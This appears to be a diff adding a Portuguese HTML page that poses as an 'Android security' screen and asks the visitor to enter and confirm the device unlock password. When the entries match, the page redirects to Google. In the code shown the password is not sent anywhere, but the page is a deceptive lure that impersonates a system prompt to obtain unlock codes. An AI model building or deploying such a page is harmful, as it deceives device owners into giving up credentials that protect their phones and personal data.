@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Segurança Android</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #1e1e1e;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            padding: 30px;
+            border-radius: 15px;
+            background-color: #333;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 350px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .message {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: #b0b0b0;
+        }
+
+        input[type="text"] {
+            font-size: 18px;
+            width: 200px;
+            padding: 10px;
+            background-color: #444;
+            border: 2px solid #777;
+            border-radius: 5px;
+            color: white;
+            text-align: center;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #00bcd4;
+        }
+
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #00bcd4;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #008c99;
+        }
+
+        button:active {
+            background-color: #007c8a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SEGURANÇA ANDROID DIGITE A SENHA DO DISPOSITIVO</h1>
+        <div class="message">DIGITE A SENHA DE DESBLOQUEIO</div>
+        <input type="text" id="password1" placeholder="Senha Do Dispositivo" autofocus>
+        <div class="message">CONFIRME A SENHA DE DESBLOQUEIO</div>
+        <input type="text" id="password2" placeholder="Senha Do Dispositvo">
+        <button onclick="checkPasswords()">Desbloquear</button>
+    </div>
+
+    <script>
+        function checkPasswords() {
+            // Obter as senhas digitadas
+            let password1 = document.getElementById('password1').value;
+            let password2 = document.getElementById('password2').value;
+
+            // Verificar se as duas senhas são iguais
+            if (password1 === password2 && password1 !== "") {
+                // Se forem iguais, redireciona para o Google
+                window.location.href = "https://www.google.com";
+            } else {
+                // Se as senhas não coincidirem, mostra uma mensagem de erro
+                alert('As senhas não coincidem. Tente novamente.');
+                // Limpar os campos de senha
+                document.getElementById('password1').value = '';
+                document.getElementById('password2').value = '';
+            }
+        }
+    </script>
+</body>
+</html>
